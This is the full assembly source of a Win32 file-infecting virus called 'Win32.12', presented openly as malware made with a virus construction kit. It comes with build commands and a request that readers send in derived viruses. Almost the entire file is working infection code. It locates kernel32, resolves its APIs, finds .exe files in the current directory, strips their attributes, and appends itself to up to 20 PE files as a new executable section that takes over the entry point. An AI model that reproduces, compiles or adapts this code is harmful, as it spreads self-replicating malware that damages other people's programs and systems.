              
;
;
; Win32.12 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.12
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 12
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 29
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov eax, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
                                        ; mov ebp, eax
                                        ; clear ebp
 xor ebp, ebp
 add ebp, eax
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov edi, -1
 mov edi, ( -1d - 31d )
 add edi, 31d
 and edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, edi
 add esi, [edi+3Ch]
                                        ; get File Alignment
 mov edx, [esi+3Ch]
 mov dword ptr [ebp+filealign], edx
                                        ; clear esi
 sub esi, esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, esi
 add edx, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edx
                                        ; get old Entrypoint
 mov ecx, dword ptr [edx+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], ecx
 mov ebx, dword ptr [edx+28h]
 mov dword ptr [ebp+OldEIP], ebx
 mov ecx, [edx+38h]
 mov dword ptr [ebp+sectionalign], -1
 and dword ptr [ebp+sectionalign], ecx
                                        ; Get last section
 mov ebx, [edx+74h]
 shl ebx, 3
                                        ; clear eax
 mov eax, 26673d
 sub eax, 26673d
 mov ax, word ptr [edx+6h]
 mov ecx, 28h
 pushad
 mov eax, eax
 mul ecx
 mov dword ptr [ebp+Misc1], eax
 popad
 mov eax, dword ptr [ebp+Misc1]
 add edx, 78h
 add edx, ebx
 add edx, eax
 mov ecx, ebp
 add ecx, offset newsection


 xchg ecx, edx
 push ecx
                                        ; Calculate the RVA of the new section
 mov ebx, [ecx-5*8+8d]
 add ebx, [ecx-5*8+12d]
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], eax
 mov dword ptr [ebp+nsphysicalsize], 0
 xor dword ptr [ebp+nsphysicalsize], ebx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], eax
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], edx
 Call Align
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov eax,[ecx-5*8+20d]
 add eax,[ecx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 push eax
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; clear edx
 mov edx, -18285d
 add edx, 18285d
 xor edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
 push dword ptr [ebp+filealign]
 pop eax
 mov ecx, edx
 mov dword ptr [ebp+AlignReg2], eax
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 push ecx
 pop dword ptr [ebp+NewSize]
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 lea eax, [ebp+newsection]
 xchg eax, edx

 pop esi
                                        ; mov ecx, 16
 mov ecx, 16d
WriteNewSectionLoop:
 push dword ptr [edx]
 pop dword ptr [esi]
 mov ebx, 88701323d                     ; Trash
                                        ; add edx, 4
 inc edx
 add edx, 3d
                                        ; add esi, 4
 inc esi
 add esi, 3d
 loop WriteNewSectionLoop
                                        ; increase section numbers
 mov edx, dword ptr [ebp+PEheader]
 inc word ptr [edx+06h]
                                        ; clear ebx
 push 0
 pop ebx
 xor ebx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], ebx
                                        ; set new EIP
 mov dword ptr  [edx+28h], ebx
                                        ; set infection mark
 mov dword ptr [edx+4Ch], -1d
 and dword ptr [edx+4Ch], '12'
 mov eax, dword ptr [ebp+nsphysicaloffset]
 push eax
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize
 lea ebx, [ebp+Virus]
 xchg esi, ebx


AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
                                        ; clear edx
 and edx, 0
 add edx, dword ptr [ebp+InfCounter]
 sub edx, 1
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 pop edx
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop ebx

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ebx

                                        ; clear esi
 push 0
 pop esi
 xor esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 53415d
 sub edx, 53415d
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 xor ecx, ecx

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 sub ecx, -1d
 push ecx
 push 80000000h or 40000000h
 lea ecx, [ebp+WFD_szFileName]

 push ecx
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        ; clear ebx
 sub ebx, ebx
 push ebx
 push ecx
 push ebx
                                        ; mov edx, 4
 mov edx, ( 4d - 6d )
 add edx, 6d
 push edx
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 or eax, eax
 jz CloseFile
                                        ; clear eax
 mov eax, 23548d
 sub eax, 23548d
 push ecx
 push eax
 push eax
                                        ; mov ebx, 2
 push 2d
 pop ebx
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; edi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 push dword ptr [ebp+NTableVA]
 pop edx


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], edx
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [edx]
                                        ; mov edx, eax
 push eax
 pop edx
                                        ; mov ebx, edx
 mov ebx, edx
 mov dword ptr [ebp+TempApisearch1], 0
 add dword ptr [ebp+TempApisearch1], ecx
 mov dword ptr [ebp+TempApisearch2], ebx
 push edi
 cld

                                        ; ebx Points to API-Name ( Kernel )
                                        ; edi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov al, byte ptr [edi]
 cmp al, byte ptr [ebx]
 jne ApiNotFound
 sub ecx, 1
 or ecx, ecx
 jz FoundApi1
                                        ; add edi, 1
 inc edi
                                        ; add ebx, 1
 add ebx, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 mov ecx, dword ptr [ebp+TempApisearch1]
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+TempApisearch2]
                                        ; clear edx
 mov edx, -27654d
 add edx, 27654d
 add edx, dword ptr [ebp+NTableTemp]
                                        ; add edx, 4
 add edx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 neg edx                                ; Trash
 xchg ebx, edx
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [edx]
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebx]
 add eax, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 push 276d
 pop eax
 lea ecx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 add ecx, 1d
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, esi

 push esi
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, ecx

 push ecx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop edx

                                        ; load API Names and Offsets
 mov edi, offset APINames
 add edi, ebp

 mov ebx, offset APIOffsets
 add ebx, ebp


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; clear ecx
 mov ecx, 23542d
 sub ecx, 23542d
 mov cl, byte ptr [edi]
                                        ; add edi, 1
 inc edi

                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; edi points to the Name
                                        ; ebx points to the offset

 call SearchAPI1
 push edi
 add dword ptr [esp], ecx
 pop edi
                                        ; mov eax, -1
 mov eax, ( -1d - 29d )
 add eax, 29d
 and eax, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], eax
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
 sub edx, 1
 jnz GetApisLoop
 mov edx, ebp
 add edx, offset Outbreak

 push edx
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 dec esp
 sub esp, 3d
                                        ; round to pages
 shr ecx, 16d
 rol ecx, 16d
                                        ; add ecx, 1
 inc ecx
GetKernelLoop:
                                        ; clear edx
 and edx, 0
 dec ecx
 mov dx, word ptr [ecx+03ch]
 cmp dx,0f800h
 je GetKernelLoop
 cmp ecx, dword ptr [ecx+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], ecx
 mov edx, ecx
 add edx, [ecx+3Ch]
 mov [KernelPE+ebp], edx
 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 mov ebx, 0
 add ebx, [eax+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 dec ebx
 add ebx, 29d
                                        ; get ATableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 sub edx, 4779822d                      ; Trash
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 jmp GetApis

;                  [ ///// * Data * \\\\\ ]

Data:
 PEheader    dd 0h
 db 'Virus : Win32.12 Author : SnakeByte',0
 OldEIP      dd 0h
 OldBase     dd 400000h
 NewEIP      dd 0h
 OTableVA    dd 0h
 TempApisearch1 dd 0h
 Misc1       dd 0h
 AlignTemp   dd 0h
 TempApisearch2 dd 0h
 Attributes  dd 0h
 TempAPI     dd 0h
 FindHandle  dd 0h
 MapAddress  dd 0h
 InfCounter  dd 0h
 AlignReg2   dd 0h
 ATableVA    dd 0h

 FileHandle  dd 0h
 NewSize     dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 Trash1      dd 0h
 MapHandle   dd 0h
 NTableTemp  dd 0h
 filealign   dd 0h

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h
 XGetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h

 KernelMZ    dd 0h

 APINames:
 db 18d, 'SetFileAttributesA'
 db 09d, 'FindClose'
 db 11d, 'CloseHandle'
 db 14d, 'FindFirstFileA'
 db 11d, 'CreateFileA'
 db 13d, 'FindNextFileA'
 db 13d, 'MapViewOfFile'
 db 18d, 'GetFileAttributesA'
 db 15d, 'UnmapViewOfFile'
 db 18d, 'CreateFileMappingA'

 KernelPE    dd 0h
 NTableVA    dd 0h
 AlignReg1   dd 0h
 filemask    db '*.eXe',0
 sectionalign   dd 0h
 counter     dw 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)





;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea ebx, [ebp+WFD_nFileSizeLow]

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
 sub dword ptr [ebp+Trash1], edx        ; Trash
                                        ; check for maximum filesize
 lea ecx, [ebp+WFD_nFileSizeHigh]
 xchg ebx, ecx

 cmp dword ptr [ebx], 0
 jne NoInfection
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, edx

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea ebx, [ebp+WFD_szFileName]
 xchg edx, ebx


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 test eax, eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop edi
                                        ; check for ZM
 movzx edx, word ptr [edi]
 xor edx, 'ZM'
 jz Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [edi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
                                        ; clear edx
 xor edx, edx
 mov ebx, ebx                           ; Trash
 add edx, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '12'
 jz Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [edx+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear ecx
 xor ecx, ecx
 xor ecx, dword ptr [ebp+Attributes]
 push ecx
 mov ebx, offset WFD_szFileName
 mov dword ptr [ebp+Trash1], ebx        ; Trash
 add ebx, ebp

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
 adc ecx, eax                           ; Trash
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx

 push dword ptr [ebp+OldBase]
 pop esi

 mov dword ptr [ebp+retBase], esi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ebx, [ebp+filemask]
 xchg ebx, edi

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 test eax, eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 or ecx, ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile
 sub edx, eax                           ; Trash

EndInfectCurDir:
                                        ; Close the Handle
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

